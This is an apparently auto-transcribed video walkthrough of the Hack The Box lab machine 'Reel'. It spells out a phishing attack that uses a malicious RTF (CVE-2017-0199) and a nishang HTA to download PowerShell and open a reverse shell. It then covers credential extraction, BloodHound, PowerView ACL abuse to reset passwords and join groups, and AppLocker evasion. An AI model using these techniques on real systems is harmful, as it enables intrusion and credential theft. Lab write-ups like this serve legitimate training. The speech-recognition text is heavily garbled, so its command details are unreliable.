 what's going on YouTube this is if set can be doing real from hack the box which I really like this box because it's the first one that forces us to use bloodhound to sniff out Active Directory misconfigurations and I just love this attack path up to that path it was still awesome you have to harvest a bunch of document files pull the author's out to get email addresses which allows you to create a phishing email that the user opens an attachment you get code execution get on the box then you can do bloodhound after we do all the bloodhound things we're going to be exploring other avenues such as the AL PC exploit we won't actually get it working I do run into time constraints at the end try and do all the extra material but hope you guys still find that beneficial so let's just jump in as always the first thing to do is MF the box with dash SC for default scripts SV enumerate versions oay up at all formats put in the end map director and call it real then the IP address which is 10 10 10 77 this can take some time to run so I've already run it looking at the results we have a whole bunch of ports open the first thing to take note of is FTP is open on port 21 its banner is Microsoft FTP D anonymous logins are allowed and upon logging in you have a documents directory so we should probably log in and grab the documents the next thing is SSH is listening on port 22 and their banner is OpenSSH 7.6 so this is a little bit odd because this indicates it's a Windows box because it has a Microsoft banner and this indicates it's a linux box because it has SSH and normal you don't have SSH on Windows so my first thought is maybe there's some type of VM technology at play here so next thing down we have an map thinking this is SMTP it didn't get an actual banner but because it is on port 25 it believes it's SMTP additionally it runs a bunch of like fingerprint scans to fingerprint scripts to get what type of service this is the key thing to really take note of is when we send a Hello request we get a 220 mail service ready and when we send extended hello we get an invalid domain address so it's behaving like a SMTP server on port 25 so it is SMTP most likely after that we have a bunch of just standard windows RPC junk and port for four or five is open that is Samba and we have Windows Server 2012 r2 standard 9600 so this is the latest release of Windows 2012 if I didn't see like this r2 standard I may assume it is a old box and then like a turtle blew it or something because I know it's just not patched at the very bottom we have outputs of the her scripts the clock skew doesn't look like it's deviated that much this is important when dealing with any type of tickets like if we were trying to forge Kerberos tickets but for this we don't really have to worry about that SMB OS discovery we know it was already Windows 2012 r2 the computer name is real the domain name is ATP local we have the fully qualified name the system time and I'm not actually sure if the servers configured in a different time zone if this changes this could be a way to kind of fingerprint where the server's location is SMB we have message signing is set to required so we can't do any type of SMB relay attacks I say that because again it looks like there is some type of VM technology at play because we have both SSH and FTP so the first thing I want to do is kind of just fingerprint what the host OS would be so if we ping 10 10 10 77 we see the TTL is set to 127 that is the default TTL and Windows so we know that IP address the host is most likely going to be Windows if we paint like a Linux host like myself we see the TTL is set to 64 so 64 is generally a Linux thing different discos do it a little bit differently I believe I've seen 128 I think that maybe just a different distro but generally when you see 127 think windows 254 think like Cisco and anything else probably some form of Linux so the first thing I guess let's look at FTP because anonymous logins allowed and that is a quick check so we'll do FTP 10 10 10 77 type anonymous we can do a blank password we can't do a blank password let's do anonymous type anything for the password and we can log in do a dir we get the documents directory so let's go into documents do another dir and we can get a few files I'm gonna do a.m. get star to download everything and then we'll disconnect from the FTP server and we'll state we organized a bit by making a FTP directory so move star that star in to FTP so let's see we can take a look at readme text and we just see please email me any RTF format procedurals I'll review and convert so it's saying do an email and RTF Rick rich text format and because SMTP is open we now know it's probably gonna be some type of fishing challenge and what we don't know is who to send the freaking fish to so I'm gonna take a look at the documents with exist tool and just look at app Locker this is gonna extract all the metadata from it and specifically I am looking for what type of crap software they're using to create the documents as well as like author and things like that so app Locker dot docx doesn't really give us that much information we probably want to open up a plucky X to see what app Locker rules are applied and then we have Windows Event Reporting so let's look at that and this one has a lot more metadata and we have the creator set to Nico atmega bank.com so we see in username and email and additionally we see the application is Microsoft Office Word so chances are this is gonna be some type of would challenge and that would put me what puts me down this next path but before we actually email him let's validate that it's a valid email so I'm going to tell that into that mail server 10 10 10 77 and I'm going have to specify the port 25 and we'll do the hello request we have to do hello with a debating so would you please subscribe calm and the server says hello back and now we can formulate a email so do mail from Bruce Wayne at Wayne Corp calm and it gets at 250 okay so let's try emailing our scpt to oh I forgot emails should be encased in these little brackets I'm not positive it matters for this but some servers are picky so let's email Nico at mega bank.com bad sequence of commands mail from and we'll copy this paste and wants to start over so let's quit at onap go back in and I'm gonna clear the screen to make it prettier so let's start this hello from please subscribe dot h TB then the next thing we want to do is mail from ok i see what is it PT 2 and then Nico at mega bang calm again this is the email we saw in the metadata of the word document and we get it ok if we try to send a email to a invalid person like Apes a cat megabank calm we get unknown user so we know that you does exist and it does this because the mail server is configured to use makeup bank.com addresses it knows all these addresses if we try to email like an extern external user like Wade Wilson at stuff comm we still get a 200 ok because that's an external address to the mail server so it can't validate if it's a correct user or not there are scripts to automate this I don't know any off not my head but at least you know how this works now and you could create a Python script to easily do this and the numerate local users if you so wanted to we'll just use any tool that does it so so before we continue and actually Fisher user let's identify what we know and do a quick recap to see if we're missing anything so we know that someone is expecting a RTF document and he'll review and convert them based upon the author of this windows event forwarding we know that Nikko atmega Corp comm is a valid user and since he created this document I'm going to assume he's the person we should email to convert documents we didn't go in brute force other user names on the makeup comm domain we know we can brute force users we just chose not to so we're hoping that Nikko is the one to open and execute documents the next thing we know is there is potentially a blocker at play we don't know exactly what the rules are so we open the document and we see hash rules for exe MSI and various scripts are in effect so it's not preventing us from running powershell so i'm willing to assume that we can just execute power shell we just can't drop a PS 1 to disk and then execute power shell because there are hash rules for that so let us go over to a Windows box create a malicious document and then we'll work on sending it over so now we have office open on a Windows machine we can begin creating the document we want to send over to Nico I'm not actually going to do the whole malicious macro thing that OTO executes when he opens it because it turns out he's not using office he's using WordPad instead I'm just going to show how I identified that he wasn't using word by putting a canary image in the document that would ping back my server if word was used to open it and the reason why I'm not showing the macro is mainly a time thing because it would take forever not forever but quite a while to type out the macro explain it for something that doesn't work to begin with so we can't even demo it a little bit of fourth-wall breaking I believe the reason why it isn't a macro challenge is just a licensing thing office licensing is a huge headache and putting it in all the labs would probably be expensive or just a headache to deal with well office could just decide not to activate I'm not exactly sure but licensing generally is a pain so enough with that let's get into creating the macro going over to the insert tab and when you do quick parts do field and then we're going to select links and references go to include picture and then we can now just put the URL of what we want to use as a canary image my IP address on HACC the box is 10 10 10 14 17 so I put that and then I put whatever I want as the image I'll just call this canary JPEG and now word is going to go and pull that image and then every time where it's opened up it'll go pull that image and download it so when we see that image gets pulled we know someone opened the document if we don't see a follow-on of the malicious macro like it downloading PowerShell downloading a ps1 script off our web server we know they didn't click enable macros or we just know something stopped it so having Canary images is pretty good because it activates before the macro and you can see if the documents are open so we'd save this send it over to or hack the Box machine then email it on to Nico nothing happens because he's not using office so I'm not going to do that just wanted to show this small part so now let us go back to our hack the box machine and begin creating the malicious RTF file back on Kali we can begin clean that malicious RT if I were to send over to Nico the only thing is I didn't really know what a malicious RTF file consists of when I started this so the first step was to just Google OTF exploit and the first result that comes back is CVE 2017 zero one nine nine and when this loads we'll be able to read it so we get the page back and we see this exploit kit says it will generate a malicious OTF or powerpoint file so let's grab this and clone it so get clone paste this in go in here and we can just do Python CVE h4 help and we can see the options we want to do we have - m and that's either generate or exp and that is exploitation mode based upon the arguments like - P for port - L payloads hosted locally this looks like it's going to be some type of exploit handler I'm not going to use this I'm just gonna generate the malicious file and host it on my own simple Python web server and main reason I'm doing that is just so we can kind of step through it a bit easier so - M generate - W I'll do capital M because that's how they have it - W for the file name we'll call this F 0 TF - you the URL of a HTA or SCT file that we want to execute so HTTP 10 10 14 17 which is the IP address of a box I believe if config tun 0 yep 10 10 14 17 then - T this is gonna be a RTF file - X 0 we don't want any obfuscation so we generate the OTF file if we want to look at it and do analysis it's still pretty hard to understand what is going on if you want to see how this exploit works I'm not going to go into it but if you copy this and Google CVE to the 1701 99 analysis you'll go to a 40 net page and this is a pretty good post on exactly how this works so we've got the RTF file the only thing we have to now is generate a malicious HDA file to do that I'm going to use nishang so we go to opt nishang then search for any files that contain HK in the name so I'm going to grab - I for HDA and we have client out ht8 ps1 so we're gonna look at this and we have a few various payloads we can use the first ones just payload this is executing command on the hosts payload URL this is going to cause PowerShell to go to a URL that we control and download and execute payload script is embedding PowerShell in the script a lot of our attack path is blind so I favor payload URL so we can see if the HTA is working because if we don't do this we don't know if the problem is with the HT a file or not so every time we can make the victim talk to us I like because that eliminates a lot of troubleshooting down the line we'd expect okay we know adhere it worked because we grab that file so yeah that's one of my favorite payload URL then we have a bunch of examples so I'm just going to copy this example and we will try running this so let's go into a htaed rectory so that was within client and then we do pw sh and if you wanted to install powershell google TJ null powershell kali and this net sec focus article is pretty good i have it open in this tab or maybe there we go so this is a good guide on installing powershell and Cali so do that if you don't have PowerShell installed now we can execute out HTA to load everything within a console then it loads that function and then payload URL ten ten fourteen seventeen upset ps1 and it's not a function type l HTI ps1 PS out HT it and I'm looking for function function out HTA that is a valid function scripts line maybe this is just a bug with Kelly Olynyk pouch on Linux so see up the Shang client out HTA then X clip selection into primary then we can just paste it in and now we should have out HT a so we can do payload URL HTTP 10 10 14 17 hip sector ps1 and there we go it created it and up the Shane client web def so what's up the Shang client and we do have the file when def web install HD a so let's see does this it's gonna call powershell IE x download string 10 to us so this looks good so the next step is to create our Python web server so go back over here make the dub dub dub CD Doug Doug Doug and now we have to copy the scripts in here so I'm going to move when depth web install HD a into root HD be boxes real and then if set dot h ta and we have to miss the one thing move it into the dub-dub-dub directory so we got this we also have to grab RTF file and we had created that in CVE and this doesn't have to be on the web server I'm just putting everything here to stay organized and make it easier and now we want to grab up nishang sit shelves yeah invoke peace powershell tcp PS one and copy this in here and we'll rename this to be epic ps1 so we have all the files here we just have to make this Rachelle call back to us and we can do that by just copying this example paste it down here change the IP address to be 10 10 14 17 and we'll do port 9000 1 so we have the RTF file we want to send to someone that will contain a link to the HTF aisle that will then redirect them to a PowerShell file to execute so python - m simple HTTP server on port 80 and now let us do netcat LVN p on 9001 and we can send the email with send email I think - H for help we want tu m and a so send email - t - F we also need for from will do epoch at megabank calm - t for - Nico at mega bank calm then we need - you for the subject - um is - you subject what is - you yeah - you subject - Jam is the message body please convert this file - a EPS echo TF that's the attachment and then - s4 the IP we want to send to ten ten ten seventy seven so we send this email and we have to do this from the dub dub dub directory where that ape sector OTF file is we send this and we should get a hit on our web server once WordPad opens so it takes a little bit descend and we don't have a hit right away it could just take a few seconds I'm gonna send another one as well oh there we go we did it get on slash so I think we screwed up the RTF file or something see if it does it again because it's not doing upset dot h ta so that was back over here was it in this window history grip Python CVE so test you it should be grabbing this I don't know why it hit setting /cp EPS HT a to be index.html and I think slash will then return a file and while that goes let's create our CVE again so CD root boxes root HT be boxes real CD CVE run this again and then let's just run that with - H for help see we did generate yes W EPS ecto ATF yes you payload URL yep t or t f x0 not sure why he's not grabbing the whole thing put this in quotes CP eps echo TF dub dub dub let's try sending this again and worst comes to worst I'll just revert the box and try it again say I cover that - dub dub dub correct yep so email was sent give it a few seconds and hopefully he gets or a file there we go so it must have been just something screwed up so now he is executing please subscribe HT a and we didn't get a shell let's do this one last time not sure why the HD a file was not the right HD a thee RTF file was screwed up but hopefully this all works now so we sent the email he should get our script which is going to direct him to please subscribe HT a and it's for fine of course it is its EPS XD a move it sect on HD a to be please subscribe dot h ta and we'll copy upset ps1 to be please subscribe PS one just in case I'm screwing up filenames with things so well have them both this is the last fail this one's going to work I have a feeling so send the email email a son we should get them to hit please subscribe got HD a which is to be a 200 ok and then it's going to cause them to go - yep ps1 and we get a shell awesome finally have everything working so the next thing we want to do is check app Locker so get app Locker policy - effective - XML to see exactly what the white listing and that is a whole bunch of junk so I'm going to do output is equal to get app Locker policy - effective XML and now we're going to send this over to a Cali box so we can kill this web server and this is gonna go back to something I had done on I think Olympus we do Etsy nginx look at my sites enabled I have a file upload file that is just enabling WebDAV on port 9001 so with that what we can do is a invoke rest method and that invoke rest method will then upload a script to a web server so upload a file I should say so let's do service nginx start so now we got nginx running on port 8000 won and it will accept a file upload and place the files and I think sov dubbed up up ver dub dub dub upload so CD dub dub dub upload so now we can do a invoke rest method with - method put - URI and then we want to put our IP address so 10 10 14 17 the name the file this will be applicable and then - body is going to be output and we've got to put a port number so copy this copy or on port 8000 won and then app Locker dot XML body help put face this in unable to connect to server I verify that nginx is started do this again there we go know your message so if we look in for dub dub dub upload we got a Polacco dot XML and when we try to open this up in Firefox we get a weird XML parsing error file not found Oh capital L so maybe there's some weird HTML encoding going on so what I'm going to do let's go back here and let's grab this and go to the top of it right here and then whoops this will run a grab go back V app I'll go to XML delete this set a mood paste was it mode paste not set mode paste set paste maybe that's it Oh yep it is that paste I was expecting to see that I didn't really wasn't thinking straight but paste it in from a team ox with control B then the right bracket and this may take a while to paste in so let's put this as a to do and oh there we go it pasted so now when we refresh we get it so it just had some weird encoding thing so we have a bunch of applicants and you can see kind of what they look like so if we look at do LS yells aren't configured so we can always use DOL scripts we can see file path rule let's do executables this ones requiring signing let's look at exceptions so we can see a bunch of directories have file conditions that are accepted but we can see like this one is looking for the file FS DM host and making sure that file has a sha-256 some of that so you can't just replace the file and expect it to work so that is how you look at the app bakka policy it is quite big so we will close that save memory and continue down the path so next thing to look at let's do get service let's see what services are running will only really concerned and the running ones so we do get service where status is equal to running and look at it we got win RM vmware tools' ssh so now we confirmed ssh is actually running on Windows H mail server I is a DWS active directory web services so we have quite a few services doesn't really get us that much there's the ftp one as well let's just go into a user directory and we see quite a few users julia nico tom brad claire administrator we go into Nico's go into his desktop we could get the user dot X file and there is also a cred Excel so if we look at this file we see it has a secure password in it so this is system management automation PS credential so we can grab this password by setting a variable let's say pass is equal to that then convert to secure string user is equal to HT be backslash Tom because that's what it's saying there and then we can do credential is equal to new object and system management automation PS credential and after that let's specify the username and the password and then we do cred we have this so we can just do cred and then FL format list not FL grad dot get Network credential and if we format this as a list we can get his password so we see tom and this password is it's magic and three exclamation points so if we think back we do have SSH on the box so I'm just going to exit this and we can SSH Tom at ten ten ten 77 paste the password in and we have a command prompt there so we do dir here let's go to his desktop we can see there is a ad audit and there is bloodhound so if we look at the note text file we see no ad attack Passman domain admin maybe we should read run cipher queries against other groups we created so that's just a little hint and then do dir we got in jesters and Power View so looks like remnants from doing a Active Directory on it and we're gonna take a step back and just assume SSH wasn't on this box because we don't need the Tom account we can run bloodhound ourselves and grab files so let us do that by going into up bloodhound and gestures and shut pound ps1 is what I want so grab this and then copy it into void root htb boxes real dub-dub-dub let's go in there and then we can do Python m simple HTTP server 80 nginx is using it so let's stop that okay so one Nico's desktop we can do I X new object net dot web client download string HTTP 10 ten fourteen seventeen was it sharp pound PS one I believe okay so we invoke bloodhound - collection method set to all and let bloodhound run exception calling invoke with two arguments what is the bloodhound query thought it was that let's go in dub-dub-dub last-straw pound do they have examples invoke bloodhound - collection method all that should work ceptin calling invoke with two arguments do we have that okay Bloodhound worked let's make a temp and just try this again - collection method all okay it still outputs things it just errors out so everything's length to 0 and then there's the zip let's just try grabbing the zip and seeing what's in it so let's do net use Z : 10 10 14 17 slash would call it share and we can do in packet SMB server and we want to do share name and path so we would call this share first let's make directory SMB to keep files organized and we can do impac it SMB server the share name which is share and then we'll do PWD to insert the current working directory so now we're NZ we can just copy stars if an to Z and if we I hope it wasn't copying a mid thing see unzip nope we got all the files so LS LA and the files do have some type of size so we know it worked so now let's go into bloodhound directory bloodhound Linux x64 and before we can actually run bloodhound we have to start something called neo4j and if you ever get the white screen on bloodhound just press ctrl R so neo4j is the database so we'll have to do that so do need a near footage a console if you want to get to this point just go to the bloodhound wiki if you github bloodhound and they have instructions for installing it but we install bloodhound the first thing we have to do is go to this remote interface and change the default password for neo4j which is going to be the password we used to log in to bloodhound so we go here database is not available near 4j is the default password and we want to set a new password I'm just gonna do password there we go we are now connected in neo4j so I'm gonna stop this and just do neo4j start to put it in the background oh crap neo let's kill this and then start it I don't think the console terminates cleanly when you just do ctrl C so that should be running we can eyes cute bloodhound now press ctrl R to refresh and neo4j put the password as password successfully logged in and now we're at bloodhound so we need to upload files to it and we put them in root htb boxes where is real real SMB and we can drag the zip over here and it's going to process the files and we should be able to now go to queries and just run various queries so we see domain admins we got Brad da administrator and another one you can go through all these but as the note said the there were no attack path directly to da we got the print operators group here and print operators actually does have a path to crap what is it administrator there's a probe ask in there so if you just google around for that you can get the SC load driver debug privilege and potentially do a profess clear and both Nico and Tom have that so that is a potential path on this box I'm not gonna show in this video there's a lot of UAC bypassing this just annoying and we'll save that for box that actually uses that as an attack path but we can see down here we have administrator it's a member of these groups and we have this so looking at this there's no new account we control here I don't really see Nikko at Tom get having direct access this is saying Nikko and Tom remembers a print operator so print operator can get you system access on our box and from there we may be able to get something and this we'd get everything because everything's on one box but local I'm into one box then you have more freedom you could use responder you could look for local admin hashes and pass the hash around the network there's a lot of different options but let's go back to our terminal and see if there's any groups we care about and bloodhound just doesn't know so let's see where is a shell our shells here so we can do like net groups slash domain and we can list all the groups and the one that sticks out is backup underscore admins because that's not a default group and chances are people that can backup things have read access to the filesystem because they have to read files to back them off so I'm going to search for Tom at HDB dot local and we're gonna put backup admins here and it's going to try to find a path from Tom to this and it did not user Tom I'm guessing this is because the Bloodhound query era del because this should be able to find it does blood how not know about backup admins let's run this back up admins htb dot local it does Tom no data backup admins Tom I think there's a file that is missing from our version of bloodhound oh gawd it so let's see let's go to Z C's not listening because we stopped it I think we'll do root HT B boxes real I'm guessing that bloodhound arrow we were getting is what screwed us up it probably just didn't grab a file we wanted got domains computers groups yeah we don't have ACLs so let's do and pack it and some be server and pack it SMB server eighty not eighty testers and then print working directory address all the way in use so did I not stop it okay this is getting confusing let us back up and we're going to redo everything get on the box so let's clean up exit even this year and we'll get a shell and do everything again because this should work and I'm not sure why it is it okay so the first thing we have to do is go into dub dub dub and let's set simple HTTP server on port 80 and then the next thing is we want to go into htb boxes real and do dub dub dub dub dub SMB i'm going to run impact get - SMB server testers PWD it says address is already in use so let us netstat a LMP grep 4 4 4 5 and we're just going to kill one one five zero seven zero kill - nine there we go now we got our zeros running we can go into here and we can run send email and send it sect ROTF this will be the Shang shell neck at LV NP 9001 on that email it's going to grab please subscribe HD a which is then going to execute epic PS 1 and then we're gonna get a shell on the box email was sent successfully give it a few seconds there we go it's executing the Shang go over here and we have sequel and Windows System so we'll do net use Z : 10 10 14 17 slash testers device names already on use if we go to Z we can't so we'll just do why is he net use y : 10 10 14 17 slash testers why there we go so now we can do I X new object net dot web client download string HTTP 10 10 14 17 / up hound ps1 should be good so invoke bloodhound - collection method all still have an error message and it air it at a different spot because now we got before we had computers and we don't we have a computer's now make dirt out CD tab will do invoke bloodhound - collection method let's go bloodhound see you know what let's exit this one last time send it again netcat well that goes on top bloodhound get pull make sure we're running the latest code CD in gestures CPE show pound ps1 to be boxes HT be boxes real dub-dub-dub we'll call this bloodhound just so we know we are calling the right thing there's a shop bloodhound ps1 ok ix new object net dot web client download string HTTP 10 10 14 17 bloodhound ps1 okay net use use queue this time 10 10 14 17 slash testers queue invoke bloodhound - collection method oh and this is looking better and bloodhound ran we didn't get an error message so lesson learned always import update your tools so I'll to bloodhound let's run this again bloodhound Winx x64 bloodhound and then we want to go to our files see it's probably this one wait screen press ctrl Lord or refresh well drag this file in groups users OU's GPIOs domains this is looking better so now let's go back to our queries show high value targets HT be local and we got different version of bloodhound showing different things we don't see that print operators thing anymore but we do see backup operators that's not backup admins server operators real enterprise domain controller so just sorting this to be kind of something you can look at nico is a member of print operators so that's where it is and print operators is a member of account operators and account operators is a member of group policy object owners and it looks like that chain stops there but that's kind of how you use bloodhound actually print operate is not a member of that that was me getting confused by that chain so that is that there's no direct paths from nico to domain admin and we could verify that by just typing like Nico HT we got local to domain admins come on click no data returned but if we did nico nico to backup admins now we get an intact path so we can see Nico has right owner - Herman h-e-b local who then has generic right and right dackel over the backup admins group so if you're confused what these mean if we just go back to Google do right owner ad security and then continue reading here scanning for Active Directory pollute privileges and privileged account this is generally a good read so right ona provides the ability to take ownership of an object and gain full control rights on that object so we can take your ownership and then change something like reset his password probably and then Herman has generic rights over backup admins so we can do generic right and right tackle so generic right reaper mission of the object right all properties on this object conform validated right to it and what was it right tackle can lead to full control of that object so full control of the object means we just can do things so let's start exploiting this and in order to exploit it we have to load PowerView up so let's copy up power sploit - dev and then we want to do recon power view over into a dub dub dub directory we can go to Anna Shang shell and do IX new object net dot web client download string HTTP 10 10 14 17 slash power view dot ps1 and load up power view and we can begin by the very first step is taking ownership over Herman from Nikko so let's go back into power sploit and we can do actually the first thing I want to resize this window should be fine we can close this window there we go that looks better so set domain object owner - identity Herman - owner identity Nico and now if we had ran bloodhound again we'll see that the path changes slightly so that wasn't the correct thing to copy this was do a dir here can we delete everything just to clean it up paste let's go bloodhound go back here HDB boxes real SMB blow it down zip paste this in it's going to process again and it still just says right outta let's try clearing the database and doing it I was wondering if it would just say hey Nico is the owner of this object so on the query nope it doesn't say Nico's donor it still just gives him writer and a permission I thought it would do like generic all against this if we owned it so let's see said to me an object owner Herman Android any nico that should be it so let's do add domain object ACL target identity Herman - principle identity Nico so that's toting Herman and giving it to ourselves - rights reset password and let's do verbose access is denied so maybe a set domain object owner did not work as though - reverse there is not let's see set domain object identity Herman under identity nico and then after that we want to add two main object ACL target identity Herman principle identity Nico writes we should be able to do this that time it worked I want the very first time I did that set domain object don't know it didn't work last for you on bloodhound and see if it says generic all over something over it so let's do invoke bloodhound collection method all and then go to blow down go to this paste this in click go there we go so now it's slightly different we have HDB he actually owns this so the first time we did that domain object owner it didn't take effect because I should have seen this and we got writer Anna and we also got force password change so we can now create a new password so past is equal to convert to secure string powershell doesn't like just passing password in plain text it always wants you to use this can secure string thing for some reason we'll call the password please subscribe stir not start exclamation point just doing this with potential password complexity issues as plain text force and that should be fine so we can do set domain user password Herrmann account password pass and reverse so we didn't get any error so I'm assuming this worked so let's try logging in with Herrmann three let's do SSH Herrmann at 10:10 1077 paste the password and we can get in in actual pen test you probably wouldn't want to do this instead you want set something like allow reversible encryption or make it Kerberos table or do something along those lines so now on this we earn the Herrmann if we wanted to we can Merc these objects as owned and now we have to abuse write access to back up admins to make herself a member of this group because Herrmann is not a member of backup admins by default he just has ownership over this ACL we can probably Google the powershell command do it I think it's like get member identity power shown get members group power view let's see 3.0 Tips & Tricks get to main group member identity list all the groups of users an effective member of so before doing this member ID Andy Herman Herman select where is it is it named Sam account name we can see what member of dear site users domain users and restrictions we're not a member of the back of Batman group so let's make a self an admin we can do add domain group member actually before we do that we have to build a new credential so cred is equal to new object system management automation PS credential and we can also do this just from this SSH session but again trying to minimize that usage because it's odd to have that handicapped we're not handicapped that ability so Herman and then we'll do pass because that should be the please subscribe thing that we did so pass this in and now we can add the main group member identity ident T backup admins members per min and then - credential cred okay so now if we go back and run this get domain group let's see what changes and there we go we're now a member of backup admins so at this point I am going to cheat and we're just going to use SSH since we showed how to do everything without it so I think it's fair that's shn and then we can go and see if we can see administrators CD users CD administrator dir and we can list files if we tom nico user CD / CD c colon CD / users CD administrator we can't get at things there so we go to desktop dir and try to view route text we still get access to denied we can't read that if we go into backup scripts there's a bunch of things let's just grab everything fine string for password and we have admin password is crack me if you can so let's exit that SSH administrator at ten ten ten seventy seven and now we're in as administrator which means we could go to the desktop and read the flag so that is the box it should also be worth noting is if you were Tom the attack path is very similar except Tom attacks clear which then goes to Becca battements so it was vulnerable for both Tom and Nico whatever his name was Nico so yeah is that um not gonna show the whole driver loading thing with the print operators group that's something Google but we will go back and do a little more enumeration just as Nico before any Active Directory stuff and demo out the AL PC thing we won't actually weaponize it but we'll show you exactly what that exploit is doing and how you can overwrite files Oh how to identify what files you're writing and then also go into a little of Watson which is the new version of Sherlock that is code to Nanette so let us oh we can do this from I guess Tom so Tom at 10:10 10:17 his password was something with magic magic egg let's see please subscribe is Herman's let's just do that please subscribe password so that was hermit I think so SSH Herman at 10:10 10:17 please subscribe exclamation point nope you know what let's do it all from machine so CD slash user slash Nico and we are Nico so with the very first user on the box super unprivileged let us take a look at Watson so Watson is on well let's do it from windows because we have to compile something so let's switch over to a Windows box so let's google github Watson and we'll add rastamouse to that because Watson's a common thing and we can pull up this and Watson's a dotnet 2.0 implementation of Sherlock because Sherlock sucks if you don't know the joke about that it's because Microsoft changed to rolling patches instead of individual hot fixes but vulnerability which makes identifying stuff a lot harder there's another video I go about that I forget which one will top my head but had to rewrite the whole engine to detecting vulnerabilities so did it in net to learn net as you go along I guess so pulling this up we can just compile it and before you compile it we need to check what dotnet version is running on the target because if we go into CD CD / what is it Windows microsoft.net framework x64 CD framework 64 not know X we have a bunch of versions of.net and if we compile it for like dotnet for seven and the only f4o it won't work so you can identify versions by going into the directory it used to be you could identify it by that v but now you have to look at a dll inside of this so we'll do get item c LD a CL or DOL verify it's there and do FL note that's not it get item seal dll let's try file is equal to that then system diagnostics file version info get version info file dot file version there we go it is four seven three one nine zero but the key thing is for 72 is the weight is version of.net on my machine we which means it's gonna work for any four compliant thing if we go back to the target and do the same thing so get CD windows microsoft.net CD framework 64 go into this v 4.0 dir and do mile I'm curious get home Cielo DOL FL yeah I don't know why was screwed and they'll put on my computer but we see dotnet version let's see what is this 4 or 5 I believe this is seeing it here we could probably Google this and c.net version their string put it here paste 4 5 1 so we have to make sure a Windows box is using.net 4 5 1 so going back over to this we can see the net by I believe right click and Watson properties target framework 4 5 so this should work so we can just build build solution there we go we go to Watson then debug and we got Watson right here so I'm going to copy this over to my Kali box I placed it in SMB so if I go to my cue drive should be able to execute Watson exe and it's thinking I actually didn't expect that to work so quickly I expected like an immediate prompts from app Locker being like you can't execute exe s and I don't know what's happening it's hyung maybe my shell died I'm gonna go with my shell died so restart everything where's the send email send email yeah go in let's send that should get a call back pretty shortly come on email sent and should hit HDA file there we go hit please subscribe and then gave a shell so let's do I don't think we actually have to not use every time we can just do CD users Nico then copy ten ten fourteen seventeen testers Watson exe yeah yeah okay let's try executing Watson and there we go this program is blocked by group policy for more information contact your system administrator we could dig into some type of a blocker bypass but we're already in PowerShell so we could just use PowerShell to execute it reflectively and we do that by loading power shelf Power View first so new object net dot web client ID download string HTTP 10 10 14 17 and the file we want I don't think it's power of you I just have a bad habit of calling power sploit power view so I'm going to do grep - our eye and we're going to do opt power sploit dev and I'm going to I miss ordered the arguments I want to look for invoke reflective PE in that directory and we see the file we want is invoke reflective PE injection we edit this file or not edit just view it we can see there's an example to load demo exe and run it locally so let's try doing this so first thing we have to do copy this over to a web server so htb boxes real dub-dub-dub and we'll call this PE PS one just because I don't feel like typing that whole name so PE dot ps1 okay so now we can do PE bytes is equal to IO file read all bytes Watson dot exe once specify the full path it's saying an error because system32 is looking so see : users Nikko Watson exe there we go it found the file so I can do invoke reflective PE injection PE bytes and then PE reckon spell and PE fights and P platform doesn't match the architecture it's being loaded in 32 vs. 64 bit so my parasol client is probably going to be 64 32 bit so we can check that by running environment is 64 bit operating system and that is true next one is environment is 64 bit I think process true let's see what we compiled Watson for CDW we copied in SMB file watson PE 32 not 64 bit so that was a mistake so we can change this to be where is 64 bit debug release build little vents is it this I don't think it's the solution fake properties release platform any CPU add-on that probably doesn't have 64 32-bit we'd have not sure how to get it work this way um we could convert Watson into a DOL so let's try this just change console application to console library build this again now I got Watson DOL will have to take note of the entry point so namespace Watson program ratsy yes Watson program main so just don't remember those three things we can copy Watson DOL we'll get it to a desktop there we go it's dropped on my SMB share so let's go back to Anna Shang shell CD 1010 1417 I'm what do I call it I called the share come on let's just search up for EM packet testers as where I called it so CD ten ten fourteen seventeen testers there we go so now we just do reflection assembly load file and then when specified the let's copy this to the hard drive then we could specify the full path I generally don't like using UNC paths when I don't know what the outcome is especially when we're doing this on video so users Neko copied it there so we can go into CD the C Drive we got Watson so deflection dot assembly load file C colon backslash users Nikko Watson exe not Exe DLL and it's parentheses not brackets C colon users Nikko Watson DLL and did I ever copy this because I'm just saying the exe CD 10 10 14 17 testers copy Watson DLL c colon users Nikko copy Watson tol c colon users Nikko Watson probably a capital W C colon users Eco there we go so good to see we can now do I have a flexion assembly here let's just type it one last time a flexion assembly load file c colon users public Nico alright sequel 1 users Nikko Watson dot DLL unable to find type reflection assembly I could type reflection assembly this must be incredibly frustrating paste there we go the dll is loaded so we can do Watson program main cannot find I don't do one thing when I compiled this public static void I think we can just do public static main and we don't want any arguments rebuild the old failed must have return type let's see so we got a new dll here let us we can try this again probably should reload all of powershell but let's try this let's just try reloading this this doesn't work fortunately we have to move on because i'm against a time crunch his videos been going on a bit longer than I expected but you should be able to Google and fix the issue the main thing I wanted to show is I have a lot of issue with nishang getting it to display dotnet output if we switched over to meterpreter we'd see that it displays output right away but getting nishang it's a bit wonky so that's the main thing I wanted to show by doing all this and we just may not be able to which is sad so load file yeah execute this yeah I forget to edit I made and Watson while I was doing it and unfortunately I reverted it before doing the video and I just can't think right now so pretend that DLL loads will walk through doing this box and Metasploit real quick and you'll get it there but small issue a user error with Watson but yeah that's what happens when I try to learn things just before doing a video and then forget what I just did so learning up Metasploit we can search for SMB let's see let's search for office and there should be a s HT a one so we can search up for HT a this the payload we want to use and we can just do use this payload show options set our host to be 10 10 14 10 10 10 77 set sir first we don't want our host let's not use at all we're just creating a document set server host is equal to 10 10 14 17 set L host is equal to 10 10 14 17 NFL or just show options so server host is on port 8080 MSF dot doc don't have bro pruning so that should be fine if we run this we see ster reverse handler whoops it's my phone stir the reverse handler on this IP this port using this URL and it saved this document so if we go back to this what we've been sending emails change the email attachment to that we should get a Metasploit shell so let's see would I do it in Windows 6 no I'm not there not there for not there okay my dim window too so hopefully we get a call back here there we go so that's a to the box and Metasploit if we had the DOL reflection working it would have worked right away but screwed up converting it to my dll and I don't want to troubleshoot the very last thing I wanted to show was the LBC exploit and unfortunately Watson's not just going to tell us to go do the exploit so we should find a different way to find the versioning information the host so I'm going to go into a shell we're going to go to CD you uh windows I'm going to type windows update log we get a bunch of data a lot of data so once this stuff stops outputting we're gonna see if we can find out when this box was last patched and wow there's we'll stop showing eventually there we go so we have a bunch of stuff here it's kind of hard to go through all these logs to find when something was installed we have a bunch of updates added 2018 January 21st which is about the time this box was released I believe but we could just cat Windows Update log and then like fine string for capital KB or something and there's a tell us when it is actually installing patches so we see the patch install was successful on the 21st of January at around 11 - yeah 11:30 at night so the a OPC expert a mout well before this time and I believe there is a Metasploit module so let's just search that one first and then we'll go through and do it without 